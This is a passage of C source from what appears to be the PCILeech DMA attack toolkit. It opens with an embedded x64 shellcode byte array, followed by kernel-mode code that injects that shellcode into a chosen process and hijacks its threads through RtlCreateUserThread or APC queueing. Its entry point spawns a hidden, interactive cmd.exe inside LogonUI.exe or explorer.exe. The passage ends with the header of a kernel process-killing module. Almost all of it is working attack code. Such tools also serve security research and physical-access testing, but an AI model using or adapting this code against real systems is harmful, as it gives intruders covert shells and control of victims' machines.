		0x40, 0x53, 0x48, 0x83, 0xec, 0x70, 0xba, 0x68, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0xd9, 0x8d, 0x4a, 0xd8, 0xff, 0x53, 0x30, 0xc7, 0x00, 0x68, 0x00,
		0x00, 0x00, 0xc7, 0x40, 0x3c, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x13,
		0x48, 0x83, 0xba, 0x08, 0x01, 0x00, 0x00, 0x00, 0x74, 0x18, 0x48, 0x8b,
		0x4b, 0x60, 0x48, 0x89, 0x48, 0x58, 0x48, 0x8b, 0x4b, 0x68, 0x48, 0x89,
		0x48, 0x50, 0x48, 0x8b, 0x4b, 0x60, 0x48, 0x89, 0x48, 0x60, 0x48, 0x8b,
		0x13, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x48, 0x45,
		0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x83,
		0x64, 0x24, 0x38, 0x00, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x30, 0x00,
		0x8b, 0x82, 0x10, 0x01, 0x00, 0x00, 0x89, 0x44, 0x24, 0x28, 0xc7, 0x44,
		0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0xff, 0x53, 0x18, 0x85, 0xc0, 0x74,
		0x26, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x8b, 0x80, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0x0b, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x08, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xff, 0x53, 0x08, 0xb8, 0x01,
		0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xe9, 0xc7,
		0x40, 0xc8, 0xfb, 0x97, 0xfd, 0x0f, 0xc7, 0x40, 0xcc, 0x80, 0x8f, 0x0c,
		0x17, 0x48, 0x8d, 0x7a, 0x48, 0xc7, 0x40, 0xd0, 0x72, 0xfe, 0xb3, 0x16,
		0x48, 0x8d, 0x70, 0xec, 0xc7, 0x40, 0xd4, 0x6b, 0xd0, 0x2b, 0xca, 0xbb,
		0x09, 0x00, 0x00, 0x00, 0xc7, 0x40, 0xd8, 0x74, 0xab, 0x30, 0xac, 0xc7,
		0x40, 0xdc, 0xfa, 0x97, 0x02, 0x4c, 0xc7, 0x40, 0xe0, 0x16, 0x65, 0xfa,
		0x10, 0xc7, 0x40, 0xe4, 0xb0, 0x49, 0x2d, 0xdb, 0xc7, 0x40, 0xe8, 0x1f,
		0x79, 0x0a, 0xe8, 0x48, 0x8d, 0x76, 0xfc, 0x48, 0x8b, 0xcd, 0x8b, 0x16,
		0x48, 0x8d, 0x7f, 0xf8, 0xe8, 0xeb, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x07,
		0x83, 0xc3, 0xff, 0x75, 0xe6, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b,
		0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50,
		0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xc1, 0x48,
		0x8d, 0x54, 0x24, 0x30, 0x48, 0x8b, 0x89, 0x80, 0x00, 0x00, 0x00, 0xff,
		0x50, 0x28, 0x33, 0xc9, 0x85, 0xc0, 0x74, 0x0f, 0x81, 0x7c, 0x24, 0x30,
		0x03, 0x01, 0x00, 0x00, 0x75, 0x05, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x8b,
		0xc1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
		0x10, 0x56, 0x48, 0x83, 0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0xab, 0x00, 0x00, 0x00, 0xbe, 0x00,
		0x08, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8, 0xa5, 0xff, 0xff, 0xff, 0x85,
		0xc0, 0x0f, 0x84, 0x96, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x43, 0x70, 0x4c,
		0x8b, 0x4b, 0x78, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x8b, 0x48, 0x10,
		0x41, 0x8b, 0x51, 0x08, 0x81, 0xe1, 0xff, 0x07, 0x00, 0x00, 0x81, 0xe2,
		0xff, 0x07, 0x00, 0x00, 0x3b, 0xca, 0x8b, 0xc2, 0x48, 0x8b, 0x4b, 0x58,
		0x77, 0x08, 0x44, 0x8b, 0xc6, 0x44, 0x2b, 0xc2, 0xeb, 0x03, 0x45, 0x33,
		0xc0, 0x49, 0x8d, 0x51, 0x68, 0x48, 0x03, 0xd0, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0xff, 0x53, 0x38, 0x85, 0xc0, 0x74, 0x4d, 0x48, 0x8b, 0x4b, 0x78,
		0x8b, 0x44, 0x24, 0x40, 0x48, 0x01, 0x41, 0x08, 0xeb, 0x1d, 0x83, 0xbb,
		0x88, 0x00, 0x00, 0x00, 0x00, 0x74, 0x36, 0x48, 0x8b, 0xcb, 0xe8, 0x35,
		0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1d, 0xb9, 0x0a, 0x00, 0x00, 0x00,
		0xff, 0x53, 0x40, 0x48, 0x8b, 0x4b, 0x78, 0x48, 0x8b, 0x43, 0x70, 0x48,
		0x8b, 0x49, 0x08, 0x48, 0x2b, 0x48, 0x10, 0x48, 0x3b, 0xce, 0x73, 0xce,
		0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x85, 0x5a, 0xff, 0xff,
		0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x5b, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x5c,
		0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83,
		0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9,
		0x74, 0x78, 0x48, 0x8b, 0xcb, 0xe8, 0xda, 0xfe, 0xff, 0xff, 0x85, 0xc0,
		0x74, 0x6c, 0x48, 0x8b, 0x53, 0x78, 0x48, 0x8b, 0x4b, 0x70, 0x48, 0x8b,
		0x42, 0x10, 0x48, 0x39, 0x41, 0x08, 0x75, 0x0a, 0xb9, 0x0a, 0x00, 0x00,
		0x00, 0xff, 0x53, 0x40, 0xeb, 0x47, 0x44, 0x8b, 0x41, 0x08, 0x48, 0x8d,
		0x51, 0x68, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0x48, 0x8b, 0x4b, 0x50, 0x25, 0xff, 0x07, 0x00, 0x00, 0x41, 0x81,
		0xe0, 0xff, 0x07, 0x00, 0x00, 0x48, 0x03, 0xd0, 0x41, 0x3b, 0xc0, 0x72,
		0x06, 0x41, 0xb8, 0x00, 0x08, 0x00, 0x00, 0x44, 0x2b, 0xc0, 0xff, 0x53,
		0x48, 0x85, 0xc0, 0x74, 0x15, 0x48, 0x8b, 0x4b, 0x78, 0x8b, 0x44, 0x24,
		0x40, 0x48, 0x01, 0x41, 0x10, 0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00,
		0x75, 0x88, 0x48, 0x8b, 0xcb, 0xe8, 0xbe, 0xfc, 0xff, 0xff, 0x48, 0x83,
		0xc4, 0x30, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xfa, 0x48, 0x8b,
		0xd9, 0x48, 0x8b, 0xcf, 0xba, 0xfa, 0x97, 0x02, 0x4c, 0xe8, 0x06, 0xfc,
		0xff, 0xff, 0xba, 0x90, 0x00, 0x00, 0x00, 0x8d, 0x4a, 0xb0, 0xff, 0xd0,
		0x48, 0x8d, 0x8b, 0xe8, 0x0e, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x89,
		0x08, 0x48, 0x8d, 0x50, 0x08, 0x48, 0x8b, 0xcf, 0xe8, 0x83, 0xfd, 0xff,
		0xff, 0x48, 0x8b, 0x0e, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x7b, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x4c, 0x8d, 0x44, 0x24,
		0x30, 0xc7, 0x44, 0x24, 0x30, 0x18, 0x00, 0x00, 0x00, 0x48, 0xba, 0x21,
		0x95, 0xef, 0xdf, 0x32, 0x12, 0x65, 0x12, 0xbf, 0x01, 0x00, 0x00, 0x00,
		0xbb, 0x00, 0x08, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x40, 0x44, 0x8b, 0xcb,
		0x48, 0x8b, 0x06, 0x48, 0x8b, 0x88, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89,
		0x4e, 0x70, 0x48, 0x8b, 0x80, 0x08, 0x01, 0x00, 0x00, 0x48, 0x05, 0x00,
		0x10, 0x00, 0x00, 0x48, 0x89, 0x46, 0x78, 0x48, 0x89, 0x11, 0x48, 0x8d,
		0x4e, 0x68, 0x48, 0x8b, 0x46, 0x78, 0x48, 0x89, 0x10, 0x48, 0x8d, 0x56,
		0x50, 0xff, 0x56, 0x10, 0x48, 0x8d, 0x56, 0x60, 0x44, 0x8b, 0xcb, 0x48,
		0x8d, 0x4e, 0x58, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0xff, 0x56, 0x10, 0x89,
		0xbe, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xe8, 0x3f, 0xfc, 0xff,
		0xff, 0x85, 0xc0, 0x75, 0x0a, 0x48, 0x8b, 0xce, 0xe8, 0xd7, 0xfb, 0xff,
		0xff, 0xeb, 0x45, 0x48, 0x8b, 0x06, 0x48, 0x83, 0xb8, 0x08, 0x01, 0x00,
		0x00, 0x00, 0x74, 0x38, 0x48, 0x83, 0x64, 0x24, 0x28, 0x00, 0x4c, 0x8d,
		0x05, 0x6b, 0xfe, 0xff, 0xff, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b,
		0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20, 0x48, 0x83, 0x64, 0x24,
		0x28, 0x00, 0x4c, 0x8d, 0x05, 0x77, 0xfd, 0xff, 0xff, 0x83, 0x64, 0x24,
		0x20, 0x00, 0x4c, 0x8b, 0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20,
		0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83,
		0xc4, 0x50, 0x5f, 0xc3
	};
	*ppb = wx64_exec_user_bin; // user data
	*pcb = sizeof(wx64_exec_user_bin);
}
#endif /* ! _EXEC_USER_EXTERNAL */

#ifdef _EXEC_USER_EXTERNAL
VOID GetUserExecShellcode(_In_ PKMDDATA pk, _Out_ PBYTE *ppb, _Out_ PDWORD pcb)
{
	*ppb = pk->ReservedKMD[2]; // user data
	*pcb = 0x1000 - (pk->ReservedKMD[2] & 0xfff);
}
#endif /* _EXEC_USER_EXTERNAL */

//----------------------------------------------------------------------------------------------------------
// USER MODE CODE SETUP BELOW:
//----------------------------------------------------------------------------------------------------------

NTSTATUS IntializeUserModeCode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, PBYTE pb, QWORD qwAddrConsoleBuffer)
{
	PBYTE pbCodeUser;
	DWORD cbCodeUser;
	GetUserExecShellcode(pk, &pbCodeUser, &cbCodeUser);

	pk->ReservedKMD[4] = 0x7777666677776666;
	pk->ReservedKMD[5] = pbCodeUser;
	pk->ReservedKMD[6] = cbCodeUser;
	pk->ReservedKMD[6] = *(PQWORD)pbCodeUser;

	PUSERSHELL_CONFIG pCfg = (PUSERSHELL_CONFIG)(pb + 0x1000 - sizeof(USERSHELL_CONFIG));
	SIZE_T cchProcToStart = fnk2->strnlen(pk->dataInStr, MAX_PATH);
	if(cchProcToStart == 0) {
		return E_INVALIDARG;
	}
	fnk->RtlZeroMemory(pb, 0x1000);
	fnk->RtlCopyMemory(pb, pbCodeUser, cbCodeUser);
	fnk->RtlCopyMemory(pCfg->szProcToStart, pk->dataInStr, MAX_PATH);
	pCfg->fCreateProcess = (DWORD)pk->dataIn[1];
	pCfg->qwAddrConsoleBuffer = qwAddrConsoleBuffer;
	return S_OK;
}

/*
* Initialized a 2-page console buffer inside the user mode process used for
* thread hi-jacking. The pages are allocated from the NoPagedPool. On success
* the memory and the MDL object allocated will be "leaked". On exit the physical
* memory location be written to dataOut[2], dataInConsoleBuffer and dataOutConsoleBuffer.
* NB! needs to be run insode a KeStackAttachProcess section.
*/
QWORD SetupConsoleBufferUserMode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	PVOID pvMemory;
	PVOID pMdl;
	QWORD qwMemoryMapped;
	// Allocate and Zero memory.
	pvMemory = fnk->ExAllocatePool(0, 0x2000);
	if(!pvMemory) {
		return NULL;
	}
	fnk->RtlZeroMemory(pvMemory, 0x2000);
	// Allocate MDL.
	pMdl = fnk2->IoAllocateMdl(pvMemory, 0x2000, FALSE, FALSE, NULL);
	if(!pMdl) {
		fnk->ExFreePool(pvMemory);
		return NULL;
	}
	fnk2->MmProbeAndLockPages(pMdl, KernelMode, IoModifyAccess);
	// Map the memory into the target process.
	qwMemoryMapped = fnk2->MmMapLockedPagesSpecifyCache(pMdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
	if(!qwMemoryMapped) {
		fnk->ExFreePool(pvMemory);
		return NULL;
	}
	// finish
	pk->dataInConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)qwMemoryMapped);
	pk->dataOutConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)(qwMemoryMapped + 0x1000));
	pk->dataOut[2] = pvMemory;
	pk->dataOut[3] = qwMemoryMapped;
	return qwMemoryMapped;
}

//----------------------------------------------------------------------------------------------------------
// Windows 7 APC ROUTINES BELOW (WORKAROUND FOR MISSING ntoskrnl!RtlCreateUserThread).
//----------------------------------------------------------------------------------------------------------
#ifdef _WIN7_COMPAT

/*
* The KernelApcRoutine is called after the user mode APC is completed. 
*/
VOID KernelApcRoutine(_In_ struct _KAPC *Apc, _Inout_ PVOID *NormalRoutine, _Inout_ PVOID *NormalContext, _Inout_ PVOID *SystemArgument1, _Inout_ PVOID *SystemArgument2)
{
	PKMDDATA pk;
	VOID(*fnExFreePool)(PVOID);
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	if(SystemArgument1 && *SystemArgument1) {
		pk = (PKMDDATA)*SystemArgument1;
		pk->dataOut[9] = MAGIC_WAIT_WORD;
	}
	if(SystemArgument2 && *SystemArgument2) {
		fnExFreePool = (VOID(*)(PVOID))*SystemArgument2;
		fnExFreePool(Apc);
	}
}

/*
* Wait for dataIn[3] (default: 60) seconds or until pk->dataOut[9] is set to MAGIC_WAIT_WORD value
*/
VOID ActionWaitForExit(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk)
{
	LONGLONG llTimeSecond = -1000000; // 100ms
	QWORD i, max;
	max = pk->dataIn[3] ? pk->dataIn[3] : 60;
	max *= 10;
	for(i = 0; i < max; i++) {
		if(pk->dataOut[9] == MAGIC_WAIT_WORD) {
			pk->dataOut[9] = 0;
			return;
		}
		fnk->KeDelayExecutionThread(KernelMode, FALSE, &llTimeSecond);
	}
	pk->dataOut[0] = ERROR_TIMEOUT;
	pk->dataOut[9] = 0;
}

/*
* Locate the PKAPC_STATE struct inside the PETHREAD opaque structure by searching for
* the first occurance of a reference to the PEPROCESS address location.
*/
PKAPC_STATE GetKApcState(_In_ PEPROCESS pEProcess, _In_ PETHREAD pEThread)
{
	for(DWORD offset = 0; offset < 256; offset += 8) {
		if((QWORD)pEProcess == *(PQWORD)((QWORD)pEThread + offset)) {
			return (PKAPC_STATE)((QWORD)pEThread + offset - 32);
		}
	}
	return NULL;
}

/*
* Locate the PKAPC_STATE struct inside the PETHREAD opaque structure by searching for
* the first occurance of a reference to the PEPROCESS address location.
*/
BOOLEAN GetKApcIsAlertable(_In_ PEPROCESS pEProcess, _In_ PETHREAD pEThread)
{
	QWORD apcs = (QWORD)GetKApcState(pEProcess, pEThread);
	apcs += sizeof(KAPC_STATE) + 3 * 8;
	return *(PBOOLEAN)apcs;
}

/*
* Retrieve a suitable thread that may be used to queue the APC onto.
*/
PETHREAD GetPEThread(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE UniqueProcessId, _In_ PEPROCESS pEProcess, _In_ DWORD cSkipThreads)
{
	NTSTATUS nt;
	PSYSTEM_PROCESS_INFORMATION pPI;
	PSYSTEM_THREAD_INFORMATION pTI;
	PETHREAD pEThread = NULL;
	HANDLE UniqueThreadId;
	PBYTE pbSPIBuffer;
	ULONG cbSPIBuffer = 0;
	QWORD i = 0;
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);
	if(nt != 0xC0000004 || !cbSPIBuffer) {
		return nt;
	}
	pbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);
	if(!pbSPIBuffer) { return NULL; }
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);
	if(NT_SUCCESS(nt)) {
		pPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;
		while(TRUE) {
			if(pPI->UniqueProcessId == UniqueProcessId) {
				for(i = 0; i < pPI->NumberOfThreads; i++) {
					// TODO: check ThreadInfos internal offset on Win7/Win8 (Win10 = OK)
					pTI = (PSYSTEM_THREAD_INFORMATION)&pPI->ThreadInfos[i];
					UniqueThreadId = pTI->ClientId.UniqueThread;
					nt = fnk2->PsLookupThreadByThreadId(UniqueThreadId, &pEThread);
					if(NT_ERROR(nt) || !GetKApcIsAlertable(pEProcess, pEThread)) {
						continue;
					}
					if(cSkipThreads) {
						cSkipThreads--;
						continue;
					}
					fnk->ExFreePool(pbSPIBuffer);
					return pEThread;
				}
				break;
			}
			if(!pPI->NextEntryOffset) {
				break;
			}
			pPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);
			if(((QWORD)pPI < (QWORD)pbSPIBuffer) || ((QWORD)pPI > (QWORD)pbSPIBuffer + cbSPIBuffer)) {
				break;
			}
		}
	}
	fnk->ExFreePool(pbSPIBuffer);
	return NULL;
}

VOID ActionDefault_QueueApcState(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, 
	PEPROCESS Process, KAPC_STATE ApcState, PVOID pvAddressUserMode)
{
	DWORD i;
	PKAPC pKApc = NULL;
	PETHREAD Thread = NULL;
	PKAPC_STATE Thread_ApcState = NULL;
	QWORD qwPID = pk->dataIn[0];
	// activate APC
	i = 0;
	do {
		Thread = GetPEThread(fnk, fnk2, (HANDLE)qwPID, Process, 0);
		if(!Thread) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x02;
			return;
		}
		Thread_ApcState = GetKApcState(Process, Thread);
		if(!Thread_ApcState) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x03;
			return;
		}
		pKApc = fnk->ExAllocatePool(0, sizeof(KAPC));
		fnk->RtlZeroMemory(pKApc, sizeof(KAPC));
		if(!pKApc) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x08;
			goto fail;
		}
		fnk->RtlZeroMemory(&ApcState, sizeof(KAPC_STATE));
		fnk2->KeInitializeApc(pKApc, Thread, OriginalApcEnvironment, &KernelApcRoutine, NULL, pvAddressUserMode, UserMode, pvAddressUserMode);
		if(!fnk2->KeInsertQueueApc(pKApc, pk, fnk->ExFreePool, 0)) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x09;
			goto fail;
		}
		if(!Thread_ApcState->UserApcPending) {
			Thread_ApcState->UserApcPending = TRUE;
		}
	} while((++i < NUM_PARALELL_APC_THREADS) && pk->dataIn[4]);
	// wait loop for magic wait word
	ActionWaitForExit(pk, fnk);
	return;
fail:
	if(pKApc) { fnk->ExFreePool(pKApc);	}
}
#endif /* _WIN7_COMPAT */

//----------------------------------------------------------------------------------------------------------
// MAIN CODE BELOW:
//----------------------------------------------------------------------------------------------------------

/*
* Module main control routine. Connects to the parent process memory and injects
* user mode code into it. Tries to spawn a thread by using RtlCreateUserThread if
* function is exported by ntoskrnl - if not (win7) a fallback onto more complicated
* KeInsertQueueApc is used instead. The injected code then creates the new process.
*/
VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	OBJECT_ATTRIBUTES ObjectAttributes;
	QWORD qwPID = pk->dataIn[0];
	PEPROCESS Process = NULL;
	PVOID pvAddressUserMode = NULL;
	SIZE_T cbUserModeMemory = 0x1000;
	QWORD qwAddrConsoleBuffer = 0;
	HANDLE ZwProcessHandle = NULL;
	KAPC_STATE ApcState;
	CLIENT_ID ClientId, ClientId_2;
	HANDLE hThread;
	// lookup process
	nt = fnk2->PsLookupProcessByProcessId((HANDLE)qwPID, &Process); // TODO: decrease handle needed???
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x01;
		return;
	}
	// allocate memory
	fnk->RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));
	ClientId.UniqueThread = 0;
	ClientId.UniqueProcess = (HANDLE)qwPID;
	nt = fnk2->ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x04;
		goto fail;
	}
	nt = fnk2->ZwAllocateVirtualMemory(ZwProcessHandle, &pvAddressUserMode, 1, &cbUserModeMemory, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x05;
		goto fail;
	}
	// Attach to user process memory
	fnk2->KeStackAttachProcess(Process, &ApcState);
	// Allocate memory for console buffer (if needed)
	if(pk->dataIn[2]) {
		qwAddrConsoleBuffer = SetupConsoleBufferUserMode(pk, fnk, fnk2);
		if(!qwAddrConsoleBuffer) {
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x06;
			fnk2->KeUnstackDetachProcess(&ApcState);
			goto fail;
		}
	}
	// Intialize user mode code
	nt = IntializeUserModeCode(pk, fnk, fnk2, (PBYTE)pvAddressUserMode, qwAddrConsoleBuffer);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x07;
		fnk2->KeUnstackDetachProcess(&ApcState);
		goto fail;
	}
	// Detach from user process memory
	fnk2->KeUnstackDetachProcess(&ApcState);
	if(fnk2->RtlCreateUserThread) {
		nt = fnk2->RtlCreateUserThread(ZwProcessHandle,	0, FALSE, 0, NULL, NULL, (QWORD)pvAddressUserMode, 0, &hThread, &ClientId_2);
		if(NT_ERROR(nt)) { 
			pk->dataOut[0] = nt;
			pk->dataOut[1] = 0x0A;
			goto fail;
		}
		CommonSleep(fnk, 250);
	} 
#ifdef _WIN7_COMPAT
	else {
		// Windows 7 fallback to more complicated KeInsertQueueApc method.
		ActionDefault_QueueApcState(pk, fnk, fnk2, Process, ApcState, pvAddressUserMode);
	}
#endif /* _WIN7_COMPAT */
fail:
	if(ZwProcessHandle) { fnk->ZwClose(ZwProcessHandle); }
	if(Process) { fnk2->ObDereferenceObject(Process); }
}

NTSTATUS GetProcessNameFromPid(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE pid, _In_ SIZE_T cb, _Out_ PBYTE pb)
{
	PEPROCESS Process;
	LPSTR sz;
	SIZE_T csz;
	NTSTATUS nt = fnk2->PsLookupProcessByProcessId(pid, &Process);
	if(NT_SUCCESS(nt)) {
		sz = fnk2->PsGetProcessImageFileName(Process);
		csz = fnk2->strnlen(sz, cb);
		fnk->RtlCopyMemory(pb, sz, csz);
	}
	return nt;
}

NTSTATUS GetPidFromPsName(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ LPSTR szPsName, _Out_ PQWORD pqwPID)
{
	NTSTATUS nt;
	PBYTE pbSPIBuffer;
	ULONG cbSPIBuffer;
	PSYSTEM_PROCESS_INFORMATION pPI;
	CHAR szPsNameBuffer[0x10];
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);
	if(nt != 0xC0000004 || !cbSPIBuffer) {
		return nt;
	}
	pbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);
	if(!pbSPIBuffer) {
		return E_OUTOFMEMORY;
	}
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);
	if(NT_SUCCESS(nt)) {
		pPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;
		do {
			fnk->RtlZeroMemory(szPsNameBuffer, 0x10);
			GetProcessNameFromPid(fnk, fnk2, pPI->UniqueProcessId, 0x10, szPsNameBuffer);
			if(0 == fnk->_stricmp(szPsNameBuffer, szPsName)) {
				*pqwPID = (QWORD)pPI->UniqueProcessId;
				break;
			}
			if(!pPI->NextEntryOffset) {
				nt = E_NOT_VALID_STATE;
				break;
			}
			pPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);
		} while(((QWORD)pPI >= (QWORD)pbSPIBuffer) && ((QWORD)pPI < (QWORD)pbSPIBuffer + cbSPIBuffer));
	}
	if(pbSPIBuffer) { fnk->ExFreePool(pbSPIBuffer); }
	return nt;
}

/*
* Module entry point.
*/
VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS fnk;
	KERNEL_FUNCTIONS2 fnk2;
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
#ifdef _PSCMD_SYSTEM
	CHAR szBINARY[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
#endif _PSCMD_SYSTEM
#ifdef _PSCMD_USER
	CHAR szBINARY[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0 };
#endif _PSCMD_USER
#ifdef _PSCMD
	CHAR szCMD[] = { 'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };
	pk->dataIn[1] = 0x08000000; // hidden window
	pk->dataIn[2] = 1; // interactive
	pk->dataIn[4] = 1; // multi thread hijack (boost)
	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szBINARY, &pk->dataIn[0]);
	if(pk->dataOut[0]) {
		pk->dataOut[1] = 0x101;
		return;
	}
	fnk.RtlCopyMemory(pk->dataInStr, szCMD, sizeof(szCMD));
#endif _PSCMD
	ActionDefault(pk, &fnk, &fnk2);
}

```

`pcileech_shellcode/wx64_pskill.c`:

```c
// wx64_pskill.c : kernel code to terminate running processes.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_pskill.c
// ml64.exe wx64_common_a.asm /Fewx64_pskill.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pskill.obj wx64_common.obj
// shellcode64.exe -o wx64_pskill.exe "TERMINATE/KILL PROCESS                                         \n===============================================================\nREQUIRED OPTIONS:                                              \n  -0   : Process PID to terminate. Example '-0 0x0fe0'.        \nOPTIONAL OPTIONS:                                              \n  -1   : Process exit status. Default: 0. Example:  '-0 0x01'. \n===== RESULT OF TERMINATE/KILL OPERATION ======================%s\nNTSTATUS  : 0x%08X                                             \n===============================================================\n"
//
#include "wx64_common.h"

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

//----------------------------------------------------------------------------------------------------------

